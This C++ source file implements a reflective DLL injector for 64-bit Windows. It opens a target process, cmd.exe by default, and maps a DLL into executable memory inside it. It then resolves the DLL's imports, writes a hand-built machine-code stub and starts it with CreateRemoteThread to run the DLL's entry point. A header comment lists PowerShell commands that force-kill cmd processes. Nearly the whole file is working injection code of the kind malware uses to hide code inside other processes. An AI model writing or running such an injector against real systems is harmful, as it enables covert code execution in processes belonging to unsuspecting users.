/*
Get-Process cmd -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | Stop-Process -Force       
Stop-Process -Id 5768 -Force
Get-Process cmd -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $PID } | Stop-Process -Force  

tasklist /m /fi "imagename eq cmd.exe"

Get-Process cmd | Select-Object Id, StartTime | Format-Table
*/

// injectorReflectiveNew.cpp
// injectorReflectiveNew.cpp
#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <tlhelp32.h>

// =====================================================
// Helpers
// =====================================================
static std::wstring ToWide(const std::string& s)
{
    if (s.empty()) return std::wstring();
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), NULL, 0);
    std::wstring w(len, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], len);
    return w;
}

static DWORD GetProcessIdByName(const std::wstring& processName)
{
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return pid;
}

static bool ReadFileToBuffer(const std::wstring& path, std::vector<BYTE>& out)
{
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        std::cerr << "[!] CreateFileW failed. Error: " << GetLastError() << "\n";
        return false;
    }

    DWORD size = GetFileSize(h, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        std::cerr << "[!] GetFileSize failed. Error: " << GetLastError() << "\n";
        CloseHandle(h);
        return false;
    }

    out.resize(size);
    DWORD read = 0;
    BOOL ok = ReadFile(h, out.data(), size, &read, NULL);
    CloseHandle(h);
    if (!ok || read != size) {
        std::cerr << "[!] ReadFile failed. Error: " << GetLastError() << "\n";
        return false;
    }
    return true;
}

// =====================================================
// Reflective mapping
// =====================================================
static bool ReflectiveInject(HANDLE hProcess,
    const std::vector<BYTE>& dllBytes,
    DWORD_PTR& outRemoteBase)
{
    // --- Parse headers ---
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cerr << "[!] Not a valid PE (missing MZ)\n";
        return false;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        std::cerr << "[!] Not a valid PE (missing PE signature)\n";
        return false;
    }

    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        std::cerr << "[!] DLL is not x64 (Machine=0x" << std::hex
            << nt->FileHeader.Machine << std::dec << ")\n";
        std::cerr << "[!] Build both the DLL and the injector as x64.\n";
        return false;
    }

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    DWORD_PTR preferredBase = nt->OptionalHeader.ImageBase;

    std::cout << "[*] Image size      : 0x" << std::hex
        << imageSize << std::dec << "\n";
    std::cout << "[*] Preferred base  : 0x" << std::hex
        << preferredBase << std::dec << "\n";

    // --- RVA -> file offset helper ---
    auto RvaToFilePtr = [&](DWORD rva) -> const BYTE* {
        if (rva < nt->OptionalHeader.SizeOfHeaders)
            return dllBytes.data() + rva;

        PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
            DWORD va = s->VirtualAddress;
            DWORD size = s->SizeOfRawData;
            if (rva >= va && rva < va + size) {
                return dllBytes.data() + s->PointerToRawData + (rva - va);
            }
        }
        return nullptr;
    };

    // --- Allocate at preferred base ONLY ---
    LPVOID remoteBase = VirtualAllocEx(
        hProcess, (LPVOID)preferredBase, imageSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!remoteBase) {
        DWORD err = GetLastError();
        std::cerr << "[!] VirtualAllocEx at 0x" << std::hex << preferredBase
            << std::dec << " failed. Error: " << err << "\n";
        if (err == ERROR_INVALID_ADDRESS) {
            std::cerr << "[!] That address is already in use — target likely "
                "already injected. Restart target and try again.\n";
        }
        return false;
    }

    if ((DWORD_PTR)remoteBase != preferredBase) {
        std::cerr << "[!] VirtualAllocEx returned 0x" << std::hex
            << (DWORD_PTR)remoteBase << " but we asked for 0x"
            << preferredBase << std::dec << "\n";
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        return false;
    }

    outRemoteBase = (DWORD_PTR)remoteBase;
    std::cout << "[*] Remote base     : 0x" << std::hex
        << outRemoteBase << std::dec << " (exact match)\n";

    // --- Write PE headers ---
    if (!WriteProcessMemory(hProcess, remoteBase,
        dllBytes.data(),
        nt->OptionalHeader.SizeOfHeaders, NULL))
    {
        std::cerr << "[!] WriteProcessMemory (headers) failed. Error: "
            << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
        return false;
    }

    // --- Write sections ---
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (sec->SizeOfRawData == 0) continue;

        LPVOID remoteSection = (LPVOID)((DWORD_PTR)remoteBase + sec->VirtualAddress);
        LPVOID localSection = (LPVOID)(dllBytes.data() + sec->PointerToRawData);

        if (!WriteProcessMemory(hProcess, remoteSection, localSection,
            sec->SizeOfRawData, NULL))
        {
            std::cerr << "[!] WriteProcessMemory (section " << i
                << ") failed. Error: " << GetLastError() << "\n";
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            return false;
        }
    }
    std::cout << "[*] Sections copied\n";

    // --- Resolve imports ---
    IMAGE_DATA_DIRECTORY impDir =
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

    if (impDir.Size > 0) {
        const BYTE* impPtr = RvaToFilePtr(impDir.VirtualAddress);
        if (!impPtr) {
            std::cerr << "[!] Import directory RVA 0x" << std::hex
                << impDir.VirtualAddress << std::dec << " not mapped\n";
            VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
            return false;
        }

        PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)impPtr;

        for (; imp->Name != 0; imp++) {
            const BYTE* namePtr = RvaToFilePtr(imp->Name);
            if (!namePtr) {
                std::cerr << "[!] Import name RVA 0x" << std::hex
                    << imp->Name << std::dec << " not mapped\n";
                VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                return false;
            }
            const char* libName = (const char*)namePtr;
            std::cout << "[*] Import library: " << libName << "\n";

            HMODULE hLib = LoadLibraryA(libName);
            if (!hLib) {
                std::cerr << "[!] LoadLibraryA('" << libName
                    << "') failed. Error: " << GetLastError() << "\n";
                VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                return false;
            }

            // FirstThunk is the IAT in the mapped image; we read the original
            // hint/name RVAs from the raw file.
            const BYTE* thunkPtr = RvaToFilePtr(imp->FirstThunk);
            if (!thunkPtr) {
                std::cerr << "[!] FirstThunk RVA 0x" << std::hex
                    << imp->FirstThunk << std::dec << " not mapped\n";
                VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                return false;
            }

            PIMAGE_THUNK_DATA localThunk = (PIMAGE_THUNK_DATA)thunkPtr;
            DWORD_PTR remoteThunkAddr = (DWORD_PTR)remoteBase + imp->FirstThunk;

            for (int k = 0; localThunk[k].u1.AddressOfData != 0; k++) {
                DWORD_PTR resolved = 0;

                if (IMAGE_SNAP_BY_ORDINAL(localThunk[k].u1.Ordinal)) {
                    WORD ord = (WORD)IMAGE_ORDINAL(localThunk[k].u1.Ordinal);
                    resolved = (DWORD_PTR)GetProcAddress(
                        hLib, (LPCSTR)(ULONG_PTR)ord);
                }
                else {
                    const BYTE* byNamePtr =
                        RvaToFilePtr((DWORD)localThunk[k].u1.AddressOfData);
                    if (!byNamePtr) {
                        std::cerr << "[!] Hint/name RVA 0x" << std::hex
                            << (DWORD)localThunk[k].u1.AddressOfData
                            << std::dec << " not mapped\n";
                        VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                        return false;
                    }
                    PIMAGE_IMPORT_BY_NAME byName = (PIMAGE_IMPORT_BY_NAME)byNamePtr;
                    resolved = (DWORD_PTR)GetProcAddress(hLib, byName->Name);
                }

                if (!resolved) {
                    std::cerr << "[!] Failed to resolve import from '"
                        << libName << "' (index " << k << ")\n";
                    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                    return false;
                }

                DWORD_PTR slot = remoteThunkAddr + k * sizeof(DWORD_PTR);
                if (!WriteProcessMemory(hProcess, (LPVOID)slot,
                    &resolved, sizeof(DWORD_PTR), NULL))
                {
                    std::cerr << "[!] WriteProcessMemory (IAT) failed. Error: "
                        << GetLastError() << "\n";
                    VirtualFreeEx(hProcess, remoteBase, 0, MEM_RELEASE);
                    return false;
                }
            }
        }
        std::cout << "[*] Imports resolved\n";
    }
    else {
        std::cout << "[*] No imports to resolve\n";
    }

    return true;
}

// =====================================================
// main — accepts <processName|pid> [dllPath]
// =====================================================
// =====================================================
// Build a small stub in the target that calls the DLL's
// entry point with the correct DllMain arguments.
// =====================================================
static DWORD_PTR WriteDllMainStub(HANDLE hProcess,
    DWORD_PTR remoteBase,
    DWORD_PTR remoteEntry)
{
    (void)remoteBase;   // hInstance is passed by CreateRemoteThread via lpParameter

    BYTE stub[] = {
        0x48, 0xC7, 0xC2, 0x01, 0x00, 0x00, 0x00,   // mov rdx, 1
        0x4D, 0x31, 0xC0,                           // xor r8, r8
        0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,         // mov rax, imm64
        0xFF, 0xD0,                                 // call rax
        0xC3                                        // ret
    };
    memcpy(&stub[12], &remoteEntry, sizeof(DWORD_PTR));

    LPVOID remoteStub = VirtualAllocEx(
        hProcess, NULL, sizeof(stub),
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!remoteStub) {
        std::cerr << "[!] VirtualAllocEx (stub) failed. Error: "
            << GetLastError() << "\n";
        return 0;
    }

    if (!WriteProcessMemory(hProcess, remoteStub, stub, sizeof(stub), NULL)) {
        std::cerr << "[!] WriteProcessMemory (stub) failed. Error: "
            << GetLastError() << "\n";
        VirtualFreeEx(hProcess, remoteStub, 0, MEM_RELEASE);
        return 0;
    }

    return (DWORD_PTR)remoteStub;
}

int main(int argc, char* argv[])
{
    std::wstring targetProcess = L"cmd.exe";
    std::wstring dllPath = L"C:\\Temp\\test.dll";
    DWORD explicitPid = 0;

    if (argc >= 2) {
        std::string first = argv[1];
        bool numeric = !first.empty() &&
            first.find_first_not_of("0123456789") == std::string::npos;
        if (numeric) {
            try { explicitPid = (DWORD)std::stoul(first); }
            catch (...) {
                std::cerr << "[!] Invalid PID: " << first << "\n";
                return 1;
            }
        }
        else {
            targetProcess = ToWide(first);
        }
    }
    if (argc >= 3) dllPath = ToWide(argv[2]);

    std::wcout << L"[*] Target process : "
        << (explicitPid ? std::to_wstring(explicitPid) : targetProcess)
        << L"\n";
    std::wcout << L"[*] DLL to inject  : " << dllPath << L"\n";

    std::vector<BYTE> dllBytes;
    if (!ReadFileToBuffer(dllPath, dllBytes)) {
        std::wcerr << L"[!] Failed to read DLL: " << dllPath << L"\n";
        return 1;
    }
    std::cout << "[*] DLL loaded locally: " << dllBytes.size() << " bytes\n";

    DWORD pid = explicitPid ? explicitPid : GetProcessIdByName(targetProcess);
    if (pid == 0) {
        std::wcerr << L"[!] Could not find process: " << targetProcess << L"\n";
        return 1;
    }
    std::wcout << L"[+] Found target PID: " << pid << L"\n";

    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (!hProcess) {
        std::cerr << "[!] OpenProcess failed. Error: " << GetLastError() << "\n";
        std::cerr << "[!] Run this injector as Administrator.\n";
        return 1;
    }

    DWORD_PTR remoteBase = 0;
    if (!ReflectiveInject(hProcess, dllBytes, remoteBase)) {
        std::cerr << "[!] Reflective mapping failed.\n";
        CloseHandle(hProcess);
        return 1;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBytes.data();
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dllBytes.data() + dos->e_lfanew);
    DWORD entryRVA = nt->OptionalHeader.AddressOfEntryPoint;
    DWORD_PTR remoteEntry = remoteBase + entryRVA;

    std::cout << "[*] Entry RVA       : 0x" << std::hex << entryRVA << std::dec << "\n";
    std::cout << "[*] Remote entry    : 0x" << std::hex << remoteEntry << std::dec << "\n";

    // --- Write the stub that properly invokes DllMain(hinst, 1, NULL) ---
    DWORD_PTR remoteStub = WriteDllMainStub(hProcess, remoteBase, remoteEntry);
    if (!remoteStub) {
        std::cerr << "[!] Failed to write remote stub.\n";
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[*] Remote stub     : 0x" << std::hex << remoteStub << std::dec << "\n";

    // --- Create the remote thread, passing remoteBase as hInstance ---
    HANDLE hThread = CreateRemoteThread(
        hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteStub,
        (LPVOID)(DWORD_PTR)remoteBase,   // RCX = hInstance
        0, NULL);

    if (!hThread) {
        std::cerr << "[!] CreateRemoteThread failed. Error: "
            << GetLastError() << "\n";
        CloseHandle(hProcess);
        return 1;
    }

    // Give the thread a few seconds to start executing DllMain.
// Do NOT wait INFINITE — the parked thread never exits.
    WaitForSingleObject(hThread, 3000);

    std::cout << "[+] Injection dispatched, thread parked inside target\n";
    std::cout << "[+] cmd.exe should still be alive\n";

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
